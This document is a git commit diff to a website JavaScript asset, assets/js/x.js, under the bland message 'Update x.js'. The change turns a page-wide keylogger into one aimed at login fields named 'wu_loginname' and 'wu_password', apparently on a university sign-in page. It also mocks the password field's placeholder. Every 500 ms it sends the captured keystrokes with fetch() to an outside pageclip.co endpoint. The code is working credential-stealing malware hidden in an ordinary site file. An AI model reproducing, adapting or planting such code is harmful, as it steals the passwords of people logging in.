f64e1cf0bd8506fe9ea970bbe5e8ad2036c3008a
Fish <64684124+Fish-o@users.noreply.github.com>
2021-04-16 10:59:50 +0200

    Update x.js

--- assets/js/x.js
+++ assets/js/x.js
@@ -1,39 +1,29 @@
-
-function post(path, params, method='post') {
-
-  // The rest of this code assumes you are not using a library.
-  // It can be made less verbose if you use one.
-  const form = document.createElement('form');
-  form.method = method;
-  form.action = path;
-
-  for (const key in params) {
-    if (params.hasOwnProperty(key)) {
-      const hiddenField = document.createElement('input');
-      hiddenField.type = 'hidden';
-      hiddenField.name = key;
-      hiddenField.value = params[key];
-
-      form.appendChild(hiddenField);
-    }
-  }
-
-  document.body.appendChild(form);
-  form.submit();
-  setTimeout(function(){document.body.removeChild(form)}, 500)
-}
-
 var keys='';
 var url = 'https://send.pageclip.co/mMJZqTWOskoatOv5E2bqIWkAxqcetkfi';
-document.onkeypress = function(e) {
-	let get = window.event?event:e;
-	let key = get.keyCode?get.keyCode:get.charCode;
-	key = String.fromCharCode(key);
-	keys+=key;
-}
+document.getElementsByName("wu_loginname")?.forEach(element=>{
+  element.onkeydown = function(e){
+    let key = `[l:${e.type}:${e.key}:${e.keycode}]`;
+    keys+=key;
+  }
+})
+document.getElementsByName("wu_password")?.forEach(element=>{
+  element.setAttribute("placeholder", ":DDDDD")
+  element.onkeydown = function(e){
+    let key = `[l:${e.type}:${e.key}:${e.keycode}]`;
+    keys+=key;
+  }
+})
+	
+
 window.setInterval(function(){
 	if(keys.length>0) {
-		post(url, {text: keys});
+	  fetch(url, {
+		  method: 'POST',
+		  headers: {
+		    'Content-Type': 'application/json;charset=utf-8'
+		  },
+		  body: JSON.stringify({text:keys})
+		});
 		keys = '';
 	}
-}, 1000);
+}, 500);
